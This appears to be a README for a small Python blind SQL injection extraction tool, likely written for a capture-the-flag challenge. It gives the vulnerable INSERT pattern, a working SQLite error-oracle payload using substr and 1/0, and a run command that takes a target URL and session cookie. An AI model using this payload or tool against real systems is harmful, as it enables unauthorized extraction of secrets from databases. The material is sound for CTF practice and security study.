# Blind-SQLi-extractor
A small Python tool to exploit blind SQL injection in a feedback-style form that stores user input via an unsafe INSERT. It recovers a secret (e.g., a flag) one character at a time by using the page’s response as an oracle (success vs. error).\

# How it works

 - The target app builds something like:
 - INSERT INTO feedback(username, feedback) VALUES(?, '<USER_INPUT>')
 - We submit payloads that succeed only when our character guess is correct, and fail otherwise, e.g. (SQLite example):
 - '||(SELECT CASE
           WHEN substr(secret,POS,1)='C' THEN ''
           ELSE (SELECT 1/0) END
         FROM secret_table)||'
 - The script loops over positions (POS = 1..N) and a character set until it reconstructs the value.
# Requirements
 -  Python 3.8+
 -  pip install requests pwntools (pwntools is only for nice progress UI)

# Quick Start
python3 pwntools_feedback_extractor.py \
  --url https://TARGET/ \
  --cookie '<session_cookie_value>' \
  --insecure          # if the site uses a self-signed cert
  
# What to edit (config)
 - SUCCESS_MARKER:\
   The substring that reliably appears only on a successful insert.

